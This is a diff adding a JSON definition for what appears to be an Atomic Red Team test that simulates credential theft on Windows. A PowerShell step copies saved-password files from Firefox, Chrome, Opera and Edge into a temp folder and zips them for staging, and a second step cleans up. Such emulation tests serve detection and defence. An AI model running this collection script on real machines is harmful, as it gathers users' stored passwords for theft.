@@ -1,0 +1,44 @@
+{
+  "id": "f543635c-1705-42c3-b180-efd6dc6e7ee7",
+  "name": "Stage Popular Credential Files for Exfiltration",
+  "description": "This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "4733e4cd-98d1-487d-b032-8b445b51b444",
+      "type": "execute-command",
+      "data": {
+        "command": "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f7d87c74-76ec-4474-8f40-80bc45eb91ac",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   \nRemove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "4733e4cd-98d1-487d-b032-8b445b51b444",
+      "p": "on-success",
+      "o": "f7d87c74-76ec-4474-8f40-80bc45eb91ac"
+    },
+    {
+      "s": "4733e4cd-98d1-487d-b032-8b445b51b444",
+      "p": "on-failure",
+      "o": "f7d87c74-76ec-4474-8f40-80bc45eb91ac"
+    }
+  ],
+  "tags": [
+    "T1555.003",
+    "atomic-red-team"
+  ]
+}
